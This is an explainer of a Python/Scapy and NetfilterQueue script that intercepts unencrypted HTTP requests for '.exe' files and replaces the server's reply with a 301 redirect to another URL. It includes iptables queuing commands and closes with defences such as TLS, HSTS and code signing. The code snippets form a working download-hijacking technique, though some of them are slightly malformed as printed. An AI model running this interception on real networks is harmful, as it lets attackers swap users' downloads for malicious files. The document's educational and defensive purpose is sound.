# Deep Dive: Understanding Network File Interception & HTTP Redirection

In network security, analyzing cleartext protocol vulnerabilities helps demonstrate why modern transport-layer security is essential. When network traffic is transmitted over unencrypted HTTP (Port 80), intermediary devices on the communication path can inspect and alter traffic streams in real time.

This document breaks down a Python demonstration script that uses **Scapy** and **NetfilterQueue** to perform TCP sequence tracking, request matching, and HTTP 301 redirection for targeted file downloads.

---

##Executive Overview

When a client initiates a file download over unencrypted HTTP (Port 80), the request and response travel across the network in cleartext. If an intermediary node controls or influences the packet routing path (e.g., via ARP spoofing or inline gateway placement), it can evaluate passing TCP streams and alter the payload before it reaches the destination.

The analyzed script demonstrates this process:
1. **Queue Redirection**: Directs network packets into a Linux kernel queue (`NFQUEUE`).
2. **Request Identification**: Monitors outgoing HTTP requests (Port 80) for targeted file extension patterns (e.g., `.exe`).
3. **TCP Acknowledgement Tracking**: Stores TCP Acknowledgement (`ACK`) numbers to map incoming response Sequence (`SEQ`) numbers back to the original request.
4. **Response Modification**: Intercepts matching HTTP responses and replaces the server payload with an `HTTP 301 Moved Permanently` redirect header pointing to an alternate URL.
5. **Checksum Recalculation & Forwarding**: Strips existing layer length and checksum fields so Scapy recalculates valid values before forwarding the packet.

---

##System Prerequisites & Environment Setup

### System Dependencies
* **Operating System**: Linux distribution with `iptables` and `netfilter` support.
* **Python Runtime**: Legacy Python 2.7 environment.
* **Libraries**:
  * `scapy`: Packet manipulation and network protocol parsing library.
  * `netfilterqueue`: Python bindings for `libnetfilter_queue`.

### Linux Kernel Packet Queue Configuration
Before the script can process packets in user space, `iptables` must be configured to divert packet streams into an `NFQUEUE`:

```bash
# Queue outbound packets (for local host testing)
iptables -I OUTPUT -j NFQUEUE --queue-num 0

# Queue inbound packets (for local host testing)
iptables -I INPUT -j NFQUEUE --queue-num 0

# Flush iptables rules after testing completes
iptables --flush
```

---

##Technical Code Breakdown

### 1. Checksum & Length Invalidation (`set_load`)

Whenever a TCP/IP payload is modified, the length and checksum fields across the IP and TCP layers become invalid. If invalid checksums are transmitted, recipient networking stacks drop the packet.

```python
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
```

* **Payload Overwrite**: Replaces `scapy.Raw` content with the new string payload.
* **Attribute Deletion**: Deleting `len` and `chksum` attributes forces Scapy to automatically recalculate valid packet lengths and checksums when serialization occurs.

---

### 2. Traffic Processing & State Tracking (`process_packet`)

The core callback function evaluates each packet in the `netfilterqueue`.

#### A. Request Phase (Destination Port 80)

```python
if scapy_packet[scapy.TCP].dport == 80:
    if ".exe" in scapy_packet[scapy.RAW].load:
        print("[+] exe Request ")
        ack_list.append(scapy_packet[scapy.TCP].ack)
```

* **Filter Target**: Checks for outbound HTTP requests destined for TCP Port 80 containing the `.exe` string within the raw application payload.
* **TCP Stream Correlation**: In TCP, the `ACK` number sent by the client in a request corresponds to the `SEQ` number that the server will send in its response. The script stores this `ACK` in `ack_list` to accurately identify the specific response packet that follows.

#### B. Response Phase (Source Port 80) & Redirection

```python
elif scapy_packet[scapy.TCP].sport == 80:
    if scapy_packet[scapy.TCP].seq in ack_list:
        ack_list.remove(scapy_packet[scapy.TCP].seq)
        print("[+] Replacing file")
        modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently
Location: http://www.example.org/index.asp

")
        packet.set_payload(str(modified_packet))
```

* **Sequence Verification**: Checks if the response's `SEQ` number matches an entry in `ack_list`.
* **Payload Substitution**: Replaces the server's original response body with a standard HTTP 301 redirect response, instructing the client browser or downloader to fetch from the specified alternate URL.
* **Payload Update**: Updates the netfilter queue item with the newly formatted packet.

#### C. Packet Release

```python
packet.accept()
```

* **Forwarding**: Releases the packet from the Linux kernel queue to continue transmission to its destination.

---

##Defensive Engineering & Risk Mitigation

The vulnerability demonstrated by cleartext packet interception emphasizes the importance of secure transport protocols and integrity verification across enterprise endpoints:

1. **Mandatory Encryption (HTTPS / TLS)**:
   * TLS encrypts application-layer data (including HTTP headers, URIs, and payloads). Intermediary network devices cannot inspect URIs for file extensions or modify packet payloads without breaking cryptographic integrity.
2. **HTTP Strict Transport Security (HSTS)**:
   * Enforces HTTPS connections at the browser level, preventing protocol downgrade attempts to unencrypted HTTP.
3. **Cryptographic Code Signing**:
   * Operating systems enforce executable signature checks (e.g., Microsoft Authenticode). Even if a file source is modified during transport, unsigned or modified binaries trigger security warnings or execution blocks.
4. **Binary Hash Verification**:
   * File downloads should be validated against publisher-provided cryptographic hashes (such as SHA-256) prior to installation or execution.

---

##Summary Flow Diagram

```
[ Client ] 
   │
   ├── (1) HTTP Request for executable (Port 80) ──► [ NetfilterQueue ]
   │                                                        │
   │                                              Records TCP ACK Number
   │                                                        │
   │                                                        ▼
   │                                                  [ Web Server ]
   │                                                        │
   │ ◄── (2) HTTP Response Payload ─────────────────────────┤
   │                  │
   │          Matches Sequence Number 
   │        Replaces Response with HTTP 301
   │                  │
   ▼                  ▼
[ Redirects Client to Specified Target URL ]
